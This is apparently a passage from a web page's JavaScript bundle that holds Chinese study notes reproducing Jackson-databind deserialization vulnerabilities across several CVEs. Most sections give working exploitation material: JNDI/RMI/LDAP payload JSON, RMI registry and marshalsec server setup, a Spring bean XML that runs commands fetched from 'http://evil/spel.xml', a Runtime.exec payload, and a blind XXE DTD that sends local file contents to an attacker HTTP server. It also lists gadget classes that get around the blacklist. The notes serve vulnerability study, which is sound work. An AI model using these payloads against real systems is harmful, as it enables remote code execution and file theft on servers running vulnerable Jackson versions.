                                          1\u3001\u5982\u679C\u6211\u4EEC\u8FD9\u91CC\u586B\u7684\u662F\u5177\u4F53\u7684\u4E1A\u52A1\u7C7B\uFF0C\u5982\u679C\u771F\u7684\u63A5\u6536\u5230\u4E00\u4E2A\u653B\u51FBjson\u5B57\u7B26\u4E32\uFF0C\u5176\u5B9E\u7A0B\u5E8F\u9996\u5148\u4E5F\u4F1A\u5BF9json\u4E2D\u7684\u7C7B\u4FE1\u606F\u662F\u5426\u548C\u6307\u5B9A\u7684\u7C7B\u4FE1\u606F\u662F\u5426\u4E00\u81F4\uFF0C\u5982\u679C\u4E0D\u4E00\u81F4\uFF0C\u76F4\u63A5\u4E0D\u4F1A\u6267\u884C\u3002
                                                  1\u3001\u5728\u53CD\u5E8F\u5217\u5316\u7684\u65F6\u5019\uFF0C\u76F4\u63A5\u62A5\u9519\uFF1A
                                                          Exception in thread "main" com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Missing type id when trying to resolve subtype of [simple type,
                                                          class com.jackson.impl.Banana]: missing type id property 'type'


          2\u3001\u6F0F\u6D1E\u590D\u73B0\uFF1A
                  \u89C1\u4E0B\u65B9\u7684\u8BE6\u60C5\u3002\u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193  \u2193



  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2017-7525

      CVE-2017-7525\u91CD\u73B0
              \u7248\u672C\u76F8\u5173\uFF1A
                      \u5F53\u65F6\u8981\u6C42\u7684\u7248\u672C\u662F\u4E0D\u4F4E\u4E8E2.8.9

              \u5229\u7528\u6761\u4EF6\uFF1A
                      1\u3001\u5F00\u542F JacksonPolymorphicDeserialization\uFF0C\u5373\u8C03\u7528\u4EE5\u4E0B\u4EFB\u610F\u65B9\u6CD5
                      2\u3001Target class \u9700\u8981\u6709\u65E0\u53C2 constructor
                      3\u3001Target class \u4E2D\u9700\u8981\u9700\u8981\u6709\u5B57\u6BB5\u7C7B\u578B\u4E3A Interface\u3001abstract class\u3001Object\uFF0C\u5E76\u4E14\u4F7F\u7528\u7684 Gadget \u9700\u8981\u4E3A\u5176\u5B50\u7C7B / \u5B9E\u73B0\u63A5\u53E3

              \u653B\u51FB\u94FE\u6D41\u7A0B\uFF1A
                      1\u3001\u4E00\u4E2A\u5E38\u89C1\u7684\u653B\u51FB\u7C7B\u662F\uFF1Acom.sun.rowset.JdbcRowSetImpl\uFF0C\u6B64\u7C7B\u7684dataSourceName\u652F\u6301\u4F20\u5165\u4E00\u4E2Armi\u7684\u6E90\uFF0C\u7136\u540E\u53EF\u4EE5\u8BBE\u7F6Eautocommit\u81EA\u52A8\u8FDE\u63A5\uFF0C\u6267\u884Crmi\u4E2D\u7684\u65B9\u6CD5\uFF1B
                              1\u3001\u8FD9\u91CC\u9996\u9009\u9700\u8981\u51C6\u5907\u4E00\u4E2ARMI\u7C7B\uFF1A
                                      Registry registry = LocateRegistry.createRegistry(1098);
                                      Reference reference = new Reference("Exploit", "Exploit", "http://localhost:8080/");
                                      registry.bind("Exploit", new ReferenceWrapper(reference));
                              2\u3001\u8FD9\u91CC\u7684Reference\u6307\u5B9A\u4E86\u7C7B\u540D\uFF0C\u4EE5\u53CA\u8FDC\u7A0B\u5730\u5740\uFF0C\u53EF\u4EE5\u4ECE\u8FDC\u7A0B\u670D\u52A1\u5668\u4E0A\u52A0\u8F7Dclass\u6587\u4EF6\u6765\u5B9E\u4F8B\u5316\uFF1B
                              3\u3001\u51C6\u5907\u597DExploit\u7C7B\uFF0C\u7F16\u8BD1\u6210class\u6587\u4EF6\uFF0C\u7136\u540E\u628A\u4ED6\u653E\u5728\u672C\u5730\u7684http\u670D\u52A1\u5668\u4E2D\u5373\u53EF\uFF1B
                              4\u3001\u8FD9\u91CC\u6211\u4EEC\u505A\u4E86\u4E00\u4E2A\u7B80\u5355\u7684\u6A21\u62DF\uFF0C\u8BA9\u670D\u52A1\u5668\u5728\u672C\u5730\u8C03\u7528\u8BA1\u7B97\u5668\uFF1B
                      2\u3001\u6709\u4E86\u4EE5\u4E0A\u8FD9\u4E9B\uFF0C\u4E0B\u9762\u8981\u51C6\u5907\u653B\u51FB\u7684json\u5B57\u7B26\u4E32\uFF0Cpayload\u5982\u4E0B\uFF1A
                              {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1098/Exploit","autoCommit":true}
                      3\u3001\u6267\u884Cpayload\u7684\u5916\u56F4\u4EE3\u7801\uFF0C\u5982\u4E0B\uFF1A
                              System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
                              ObjectMapper objectMapper = new ObjectMapper();
                              objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
                              String json = "{\\"@class\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"rmi://localhost:1098/Exploit\\",\\"autoCommit\\":true}";
                              objectMapper.readValue(json, Object.class);
                      4\u3001\u6267\u884C\u6D41\u7A0B\u5206\u6790\uFF1A
                              1\u3001\u5728\u53CD\u5E8F\u5217\u5316\u7684\u65F6\u5019\uFF0C\u5148\u6267\u884CsetDataSourceName\u65B9\u6CD5\uFF0C
                              2\u3001\u7136\u540EsetAutoCommit\u7684\u65F6\u5019\u4F1A\u81EA\u52A8\u8FDE\u63A5\u8BBE\u7F6E\u7684dataSourceName\u5C5E\u6027\uFF0C
                              3\u3001\u6700\u7EC8\u83B7\u53D6\u5230Exploit\u7C7B\u6267\u884C\u5176\u4E2D\u7684\u76F8\u5173\u64CD\u4F5C\uFF0C
                              4\u3001\u4EE5\u4E0A\u7684\u7A0B\u5E8F\u4F1A\u5728\u672C\u5730\u8C03\u8D77\u8BA1\u7B97\u5668

              \u5B98\u65B9\u6E90\u7801\u7684\u4E00\u4E9B\u4FEE\u590D\uFF1A
                      1\u3001\u5982\u679C\u505A\u5347\u7EA7\u5904\u7406\uFF0C\u5347\u7EA7\u52302.8.10\u7248\u672C\uFF0C\u540C\u6837\u6267\u884C\u4EE5\u4E0A\u7684\u4EE3\u7801\uFF0C\u7ED3\u679C\u5982\u4E0B\uFF1A
                              Exception in thread "main" com.fasterxml.jackson.databind.JsonMappingException: Invalid type definition for type Lcom/sun/rowset/JdbcRowSetImpl;:
                              Illegal type (com.sun.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons
                      2\u3001\u53EF\u4EE5\u53D1\u73B0JdbcRowSetImpl\u5DF2\u7ECF\u8FDB\u5165\u4E86jackson\u7684\u9ED1\u540D\u5355\u4E2D\uFF1B
                              1\u3001\u4F46\u662F\u9ED1\u540D\u5355\u5F80\u5F80\u662F\u4E0D\u5168\u7684\uFF0C\u540E\u7EED\u53EF\u80FD\u7ECF\u5E38\u7206\u51FA\u6F0F\u6D1E\uFF0C\u6BD4\u5982\u8FD9\u6B21\u7684\u6F0F\u6D1E \u2014\u2014\u2014\u2014\u2014\u2014 \u300ACVE-2020-24616\u300B

  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-24616

      \u539F\u7406\uFF1A
              1\u3001br.com.anteros:Anteros-DBCP \u4E2D\u5B58\u5728\u65B0\u7684\u53CD\u5E8F\u5217\u5316\u5229\u7528\u94FE\uFF0C\u53EF\u4EE5\u7ED5\u8FC7 jackson-databind \u9ED1\u540D\u5355\u9650\u5236
                      \u8FDC\u7A0B\u653B\u51FB\u8005\u901A\u8FC7\u5411\u4F7F\u7528\u8BE5\u7EC4\u4EF6\u7684web\u670D\u52A1\u63A5\u53E3\u53D1\u9001\u7279\u5236\u8BF7\u6C42\u5305\uFF0C\u53EF\u4EE5\u9020\u6210 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C \u5F71\u54CD\u3002
              2\u3001\u6240\u6709 \u53EF\u5229\u7528\u7684\u94FE\uFF1A
                      br.com.anteros:Anteros-DBCP
                      org.arrahtec:profiler-core
                      com.nqadmin.rowset:jdbcrowsetimpl
                      com.pastdev.httpcomponents:configuration

      \u5F71\u54CD\u7248\u672C\uFF1A
              \u300Afasterxml:jackson-databind: < 2.9.10.6\u300B

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2017-17485",`

  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2017-17485
      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

      \u5229\u7528\u6761\u4EF6

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001\u9488\u5BF9CVE-2017-7525 \u9ED1\u540D\u5355\u4FEE\u590D \u7ED5\u8FC7\uFF0C\u5229\u7528\u4E86 org.springframework.context.support.FileSystemXmlApplicationContext\u3002

      \u539F\u7406\u5206\u6790
              1\u3001\u5229\u7528 FileSystemXmlApplicationContext \u52A0\u8F7D\u8FDC\u7A0B bean \u5B9A\u4E49\u6587\u4EF6\uFF0C\u521B\u5EFA ProcessBuilder bean\uFF0C\u5E76\u5728 xml \u6587\u4EF6\u4E2D\u4F7F\u7528 Spring EL \u6765\u8C03\u7528 start() \u65B9\u6CD5\u5B9E\u73B0\u547D\u4EE4\u6267\u884C

      \u6F0F\u6D1E\u5229\u7528
              1\u3001\u5229\u7528\u8BE5\u6F0F\u6D1E\uFF0C\u6211\u4EEC\u9700\u8981\u521B\u5EFA\u4E00\u4E2Abean\u6587\u4EF6\uFF0C\u653E\u7F6E\u5728\u4EFB\u610F\u670D\u52A1\u5668\u4E0A\uFF0C\u5982 http://evil/spel.xml\uFF0C \u5185\u5BB9\u5982\u4E0B
                      <bean id="pb" class="java.lang.ProcessBuilder">
                          <constructor-arg>
                              <array>
                                  <value>touch</value>
                                  <value>/tmp/prove2.txt</value>
                              </array>
                          </constructor-arg>
                          <property name="any" value="#{ pb.start() }"/>
                      </bean>
              2\u3001\u53D1\u9001\u5982\u4E0B\u6570\u636E\u5305\uFF0C\u4F7FJackson\u52A0\u8F7Dbean\uFF0C\u89E6\u53D1\u6F0F\u6D1E
                      payload\u5982\u4E0B\uFF1A
                              { "param": [ "org.springframework.context.support.FileSystemXmlApplicationContext", "http://evil/spel.xml" ] }

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-8840",`

  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-8840
      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              2.0.0 - 2.9.10.2

      \u5229\u7528\u6761\u4EF6

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001\u8FD9\u4E2ACVE\u5229\u7528 xbean-reflect\u5229\u7528\u94FE \u9020\u6210JNDI\u6CE8\u5165
                      xxxxxx

      \u539F\u7406\u5206\u6790
              1\u3001


      \u6F0F\u6D1E\u5229\u7528
              1\u3001\u542F\u52A8\u4E00\u4E2AWeb\u670D\u52A1\u5668\uFF0C\u5E76\u5C06\u7F16\u8BD1\u7684Exploit.class\u653E\u5165\u6839\u76EE\u5F55\u4E2D
                      python -m http.server 18080
              2\u3001\u542F\u52A8LDAP\u670D\u52A1\uFF1A
                      1\u3001\u4F7F\u7528 marshalsec \u6765\u542F\u52A8\u4E00\u4E2ALDAP\u670D\u52A1\uFF1A
                              java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:18080/#Exploit
              3\u3001payload\u5982\u4E0B\uFF1A
                      String json = "[\\"org.apache.xbean.propertyeditor.JndiConverter\\", {\\"asText\\":\\"ldap://localhost:18080/Exploit\\"}]";


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-14060",`

  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-14060
      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              jackson-databind < 2.9.10.4
              jackson-databind < 2.8.11.6
              jackson-databind < 2.7.9.7

      \u5229\u7528\u6761\u4EF6
              1\u3001\u5F00\u542FenableDefaultTyping()
              2\u3001\u4F7F\u7528\u4E86org.apache.drill.exec:drill-jdbc-all\u7B2C\u4E09\u65B9\u4F9D\u8D56
                      1.\u5C40\u9650\uFF1A
                              \u8FD9\u91CC\u7684\u6F0F\u6D1E\u6240\u4F7F\u7528\u7684\u5E93\u5305\u9700\u8981\u5728 \u300A1.4\u7248\u672C\u300B \u624D\u53EF\u4EE5\uFF0C\u4E4B\u540E\u6CA1\u6709\u8BE5\u6F0F\u6D1E\u7C7B\uFF0C\u800C\u76EE\u524D\u6700\u65B0\u7684\u5DF2\u7ECF\u662F1.17.0\u4E86\uFF0C\u6240\u4EE5\u603B\u4F53\u6765\u8BF4\u8F83\u4E3A\u9E21\u808B~

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001\u8FD9\u4E2ACVE\u5229\u7528 xbean-reflect\u5229\u7528\u94FE \u9020\u6210JNDI\u6CE8\u5165
                      xxxxxx

      \u539F\u7406\u5206\u6790
              1\u3001


      \u6F0F\u6D1E\u5229\u7528
              1\u3001\u542F\u52A8\u4E00\u4E2AWeb\u670D\u52A1\u5668\uFF0C\u5E76\u5C06\u7F16\u8BD1\u7684badClassName.class\u653E\u5165\u6839\u76EE\u5F55\u4E2D
                      1\u3001badClassName.java\u6E90\u7801\uFF1A
                              Runtime.getRuntime().exec("calc");  // \u5F39\u51FA\u8BA1\u7B97\u5668
                      2\u3001python -m http.server 18080
              2\u3001\u542F\u52A8LDAP\u670D\u52A1\uFF1A
                      1\u3001\u53EF\u4EE5\u624B\u5199\u4E00\u4E2A LDAPServer \u670D\u52A1\uFF0C\u89C1 LDAPServer.java \u6587\u4EF6\uFF1A
                              xxxxxx
              3\u3001payload\u5982\u4E0B\uFF1A
                      String payload = "[\\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\\",{\\"jndiPath\\":\\"ldap://127.0.0.1:1389/badClassName\\"}]";


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-14062",`


  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-14062
      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              jackson-databind < 2.9.10.4
              jackson-databind < 2.8.11.6
              jackson-databind < 2.7.9.7


      \u5229\u7528\u6761\u4EF6
              1\u3001\u5F00\u542FenableDefaultTyping()
              2\u3001\u4F7F\u7528\u4E86org.jsecurity.realm.jndi.JndiRealmFactory\u7B2C\u4E09\u65B9\u4F9D\u8D56

      \u6F0F\u6D1E\u6982\u8FF0

      \u539F\u7406\u5206\u6790


      \u6F0F\u6D1E\u5229\u7528
              1\u3001payload\u5982\u4E0B\uFF1A
                      String payload = "[\\"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\\",{\\"jndiPath\\":\\"ldap://127.0.0.1:1389/badClassName\\"}]";


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-14195",`



  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-14195
      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              jackson-databind < 2.9.10.4
              jackson-databind < 2.8.11.6
              jackson-databind < 2.7.9.7


      \u5229\u7528\u6761\u4EF6
              1\u3001\u5F00\u542FenableDefaultTyping()
              2\u3001\u4F7F\u7528\u4E86org.jsecurity.realm.jndi.JndiRealmFactory\u7B2C\u4E09\u65B9\u4F9D\u8D56

      \u6F0F\u6D1E\u6982\u8FF0

      \u539F\u7406\u5206\u6790


      \u6F0F\u6D1E\u5229\u7528
              1\u3001payload\u5982\u4E0B\uFF1A
                      String payload = "[\\"org.jsecurity.realm.jndi.JndiRealmFactory\\",{\\"jndiNames\\":\\"ldap://127.0.0.1:1389/badClassName\\"}]";



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Jackson JDOM XSLTransformer \u6F0F\u6D1E",`



  Jackson JDOM XSLTransformer \u6F0F\u6D1E
      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              \u300AJackson 2.x < 2.9.9\u300B


      \u5229\u7528\u6761\u4EF6
              1\u3001\u5F00\u542FenableDefaultTyping
              2\u3001\u4F7F\u7528\u4E86JDOM 1.x \u6216 JDOM 2.x \u4F9D\u8D56

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001\u5728Jackson 2.x ~ Jackson 2.9.9,
                      1\u3001\u5F53\u5F00\u53D1\u4EBA\u5458\u5728\u5E94\u7528\u7A0B\u5E8F\u4E2D\u901A\u8FC7ObjectMapper\u5BF9\u8C61\u8C03\u7528enableDefaultTyping\u65B9\u6CD5\u5E76\u4E14\u670D\u52A1\u7AEF\u4F7F\u7528\u4E86JDOM 1.x \u6216 JDOM 2.x \u4F9D\u8D56\u5E93\u65F6\uFF0C
                              1\u3001\u653B\u51FB\u8005\u53EF\u4EE5\u53D1\u9001\u6076\u610F\u7684JSON\u6D88\u606F\uFF0C\u8BFB\u53D6\u8FDC\u7A0B\u670D\u52A1\u5668\u4E0A\u7684\u4EFB\u610F\u6587\u4EF6\u3002

      \u539F\u7406\u5206\u6790
              1\u3001\u6F0F\u6D1E\u539F\u7406\uFF0C\u53EF\u4EE5\u770B\u8FD9\u7BC7\u6587\u7AE0\uFF1A
                      \u300AJackson JDOM XSLTransformer Gadget\u6D45\u6790\u300B https://xz.aliyun.com/t/7820


      \u6F0F\u6D1E\u5229\u7528
              1\u3001\u8BE5XXE\u5C5E\u4E8EBlind XXE\uFF0C\u6211\u4EEC\u6784\u9020\u4EE5\u4E0B\u6076\u610Fxml\u4EE3\u7801\uFF0C\u5B83\u4F1A\u53BB\u8C03\u7528\u4F4D\u4E8E\u6211\u4EEC\u7684\u653B\u51FB\u4E3B\u673A\u4E0A\u7684\u5916\u90E8dtd\u6587\u4EF6\uFF1A
                      1\u3001\u8FD9\u91CC\u7684\u653B\u51FB\u4E3B\u673A\uFF0C\u4EE5\u672C\u5730\u542F\u52A8\u7684Http\u670D\u52A1\u6A21\u62DF
                      2\u3001\u4E0D\u5728\u540C\u4E00\u4E2A\u6587\u4EF6\u5199\u5165\u8981\u8BFB\u53D6\u7684\u6587\u4EF6\u4E3B\u8981\u662F\u4E3A\u4E86\u907F\u514D\u53C2\u6570\u5B9E\u4F53\u5F15\u7528\u65F6\u53D1\u751F\u7684\u9519\u8BEF
                      3\u3001XML\u4EE3\u7801\u5982\u4E0B
                              <?xml version="1.0" ?>
                              <!DOCTYPE any[
                              <!ENTITY % file SYSTEM "file:///g:/json.txt">
                              <!ENTITY % remote SYSTEM "http://127.0.0.1:4444/evil.dtd">
                              %remote;
                              %send;
                              ]>
                              <foo></foo>

              2\u3001\u7F16\u5199evil.dtd
                      1\u3001\u4EE3\u7801\u5982\u4E0B\uFF1A
                              <!ENTITY % ppp "<!ENTITY &#x25; send SYSTEM 'http://127.0.0.1/%file;'>">
                              %ppp;

              3\u3001\u8D77\u4E00\u4E2Aweb\u670D\u52A1\uFF0C\u7AEF\u53E3\u4E3A4444\uFF0C\u5C06\u4EE5\u4E0A\u4E24\u4E2Axml\u6587\u4EF6\u653E\u5165\u5176\u4E2D\u3002
                      python -m http.server 4444

              4\u3001\u518D\u8D77\u4E00\u4E2Aweb\u670D\u52A1\uFF0C\u7AEF\u53E3\u4E3A80\uFF0C\u63A5\u53D7\u76F2\u6253\u8FD4\u56DE\u7684\u4FE1\u606F
                      python -m http.server 80

              5\u3001payload\u5982\u4E0B\uFF1A
                      String payload = "[\\"org.jdom2.transform.XSLTransformer\\", \\"http://127.0.0.1:4444/poc.xml\\"]";



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-35728",`

  JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-35728

      \u539F\u7406\uFF1A
              1\u3001\u8BE5\u6F0F\u6D1E\u662F\u7531\u4E8E com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool \u7EC4\u4EF6\u5E93\u5B58\u5728\u4E0D\u5B89\u5168\u7684\u53CD\u5E8F\u5217\u5316\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\u6F0F\u6D1E\u5B9E\u73B0\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C

      \u5F71\u54CD\u7248\u672C\uFF1A
              \u300AFasterXML jackson-databind 2.x < 2.9.10.8\u300B

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("JackSon-DataBind \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E________CVE-2020-36179\u81F3CVE-2020-36189\uFF0C\u5171 11 \u4E2A\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E",`

  JackSon-DataBind  CVE-2020-36179\u81F3CVE-2020-36189\uFF0C\u5171 11 \u4E2A\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E                  \uFF08\u4E0B\u9762\uFF0C\u8FD8\u6709\u4E2A\u522B\u6F0F\u6D1E\u7684\u7EC6\u5206\uFF09

      \u539F\u7406\uFF1A
              1\u3001\u8BE5\u6F0F\u6D1E\u662F\u7531\u4E8EJackson\u9ED1\u540D\u5355\u8FC7\u6EE4\u4E0D\u5B8C\u6574\u800C\u5BFC\u81F4\uFF0C\u5F53\u9879\u76EE\u5305\u4E2D\u5B58\u5728\u4E0B\u9762\u51E0\u4E2A\u7C7B\u65F6\u53EF\u4EE5\u8FDB\u884CJNDI\u6CE8\u5165\u3002
                      oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS
                      org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS
                      org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS
                      org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS
                      org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool
                      org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource
                      org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource
                      org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource
                      org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource
                      com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource
                      com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource
              2\u3001\u653B\u51FB\u6D41\u7A0B\uFF1A
                      1\u3001\u5F53\u5F00\u53D1\u4EBA\u5458\u5728\u5E94\u7528\u7A0B\u5E8F\u4E2D\u901A\u8FC7ObjectMapper\u5BF9\u8C61\u8C03\u7528enableDefaultTyping\u65B9\u6CD5\u65F6\uFF0C\u7A0B\u5E8F\u5C31\u4F1A\u53D7\u5230\u6B64\u6F0F\u6D1E\u7684\u5F71\u54CD\u3002
                              1\u3001\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u53D1\u9001\u7279\u5236\u7684JSON\u6D88\u606F\u5229\u7528\u8BE5\u6F0F\u6D1E\u6267\u884C\u4EFB\u610F\u4EE3\u7801\uFF0C\u76F4\u63A5\u83B7\u53D6\u670D\u52A1\u5668\u63A7\u5236\u6743\u9650\u3002
                                      1\u3001\u670D\u52A1\u7AEF\u5728\u53CD\u5E8F\u5217\u5316\u4F20\u5165\u7684\u6076\u610Fjson\u6570\u636E\u65F6\uFF0C\u4F1A\u89E6\u53D1\u8FDC\u7A0BJNDI\u6CE8\u5165\uFF0C\u5C06\u8FDC\u7A0B\u7C7B\u52A0\u8F7D\u5230\u672C\u5730\u6267\u884C\uFF0C\u6700\u7EC8\u5B9E\u73B0\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u3002

      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              \u300A2.0.0 <= FasterXML jackson-databind < 2.9.10.8\u300B


  \u5355\u72EC\u62FF\u51FA\u6765\u7684\uFF1A
      CVE-2020-36186
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      \u300AJackson-databind < 2.9.10.7\u300B

              \u5229\u7528\u6761\u4EF6
                      1\u3001\u5F00\u542FenableDefaultTyping()
                      2\u3001\u4F7F\u7528\u4E86commons-dbcp\u7B2C\u4E09\u65B9\u4F9D\u8D56\u5E93
              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\u7C7B\uFF0C\u7ED5\u8FC7\u4E86\u4E4B\u524Djackson-databind\u7EF4\u62A4\u7684\u9ED1\u540D\u5355\u7C7B\uFF0C\u5E76\u4E14JDK\u7248\u672C\u8F83\u4F4E\u7684\u8BDD\uFF0C\u53EF\u9020\u6210RCE\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001PerUserPoolDataSource\u7C7B\u7EE7\u627F\u81EAInstanceKeyDataSource:
                              xxxxxx
                      2\u3001InstanceKeyDataSource\u7C7B\u4E2D\u5B58\u5728\u4E00\u5904JNDI\u6CE8\u5165\uFF1A
                              xxxxxx
                      3\u3001testCPDS\u5728PerUserPoolDataSource\u7C7B\u7684registerPool\u4E2D\u88AB\u8C03\u7528\uFF1A
                              xxxxxx
                      4\u3001registerPool\u5728getPooledConnectionAndInfo\u4E2D\u88AB\u8C03\u7528\uFF1A
                              xxxxxx
                      5\u3001\u6240\u4EE5\u53EF\u4EE5\u6784\u9020\u4EE5\u4E0BGadget\uFF1A
                              PerUserPoolDataSource
                                  ->InstanceKeyDataSource.setDataSourceName
                                      ->PerUserPoolDataSource.getPooledConnectionAndInfo
                                          ->PerUserPoolDataSource.registerPool
                                              ->PerUserPoolDataSource.testCPDS
                                                  ->lookup

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u8BF4\u660E\uFF1A\u8FD9\u91CC\u4F7F\u7528 LDAP \u7684\u5229\u7528\u65B9\u5F0F\u8FDB\u884C\u6F0F\u6D1E\u7684\u5229\u7528\u6F14\u793A\uFF0CRMI\u7684\u65B9\u5F0F\u4E5F\u662F\u7C7B\u4F3C\u7684\u3002\u4E14RMI\u76F8\u5BF9\u4E8ELDAP\uFF0C\u8981\u5BF9JDK\u7248\u672C\u6709\u5F88\u5927\u7684\u5C40\u9650\u6027~
                      2\u3001LDAP\u5229\u7528\u65B9\u5F0F\u7684\u73AF\u5883\u7248\u672C\uFF1A
                              jdk\u7248\u672C\uFF1A
                                      JDK 11.0.1\u30018u191\u30017u201\u30016u211\u4E4B\u524D\uFF0C\u7B14\u8005\u8FD9\u91CC\u91C7\u7528JDK 1.8.0_181
                      3\u3001\u6B65\u9AA4\uFF1A
                              1\u3001\u7F16\u8BD1Exploit.java
                                      1\u3001\u4EE3\u7801\u5982\u4E0B\uFF1A
                                              xxxxxx
                                      2\u3001\u5728\u547D\u4EE4\u884C\uFF0C\u7F16\u8BD1Exploit.java\u6587\u4EF6
                              2\u3001\u642D\u5EFAHTTP\u670D\u52A1
                                      1\u3001\u4F7F\u7528 Python \u642D\u5EFA\u7B80\u6613 SimpleHTTPServer \u670D\u52A1
                                              python -m  SimpleHTTPServer 28080
                              3\u3001\u642D\u5EFALDAP\u670D\u52A1
                                      1\u3001\u4F7F\u7528 marshalsec \u6765\u542F\u52A8\u4E00\u4E2ALDAP\u670D\u52A1\uFF1A
                                              \u9700\u8981\u5148\u4E0B\u8F7D\uFF0CMarshalSec.jar \u7684JAR\u5305\u3002
                              4\u3001\u6267\u884C\u6F0F\u6D1EPOC
                                      1\u3001Poc.java\u4EE3\u7801\u5982\u4E0B\u6240\u793A
                                              String json = "[\\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\\", {\\"dataSourceName\\":\\"ldap://127.0.0.1:28080/Exploit\\"}]"
                                      2\u3001\u4E4B\u540E\u8FD0\u884C\u8BE5\u7A0B\u5E8F\uFF0C\u6210\u529F\u6267\u884C\u547D\u4EE4

      CVE-2020-36188
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001FasterXML jackson-databind 2.x < 2.9.10.8\u7684\u7248\u672C\u5B58\u5728\u8BE5\u6F0F\u6D1E\uFF0C
                              \u8BE5\u6F0F\u6D1E\u662F\u7531\u4E8E com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\u7EC4\u4EF6\u5E93 \u5B58\u5728\u4E0D\u5B89\u5168\u7684\u53CD\u5E8F\u5217\u5316\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u80FD\u5229\u7528\u6F0F\u6D1E\u5B9E\u73B0\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u3002

              \u539F\u7406\u5206\u6790
                      \u548C\u540C\u7CFB\u5217\u7684\u5176\u5B83\u6F0F\u6D1E\uFF0C\u90FD\u57FA\u672C\u4E00\u81F4\u3002

              \u6F0F\u6D1E\u5229\u7528
